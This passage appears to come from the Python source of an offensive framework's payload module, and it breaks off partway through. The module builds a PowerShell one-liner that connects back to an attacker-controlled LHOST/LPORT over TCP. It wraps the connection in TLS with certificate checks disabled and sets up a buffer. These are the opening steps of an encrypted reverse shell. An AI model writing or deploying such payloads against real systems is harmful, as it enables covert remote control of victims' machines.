...
class Module(Payload):
	...
	server_name = OptString("", "TLS SNI / AuthenticateAsClient target (defaults to LHOST)", False)
	...
	def _tls_host(self) -> str:
		return str(self.server_name or self.lhost).strip() or str(self.lhost)

	def _build_script(self, xf_client_code: str = None) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		tls_name = self._tls_host().replace("'", "''")

		core = (
			f"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
			f"$raw=$c.GetStream();"
			f"$s=New-Object Net.Security.SslStream($raw,$false,({{$true}}));"
			f"try{{$s.AuthenticateAsClient('{tls_name}')}}catch{{"
			f"$s.AuthenticateAsClient('{tls_name}',$null,[System.Security.Authentication.SslProtocols]::Tls12,$false)}};"
			"[byte[]]$b=0..65535|%{0};"
		)
		if xf_client_code:
			loop = (
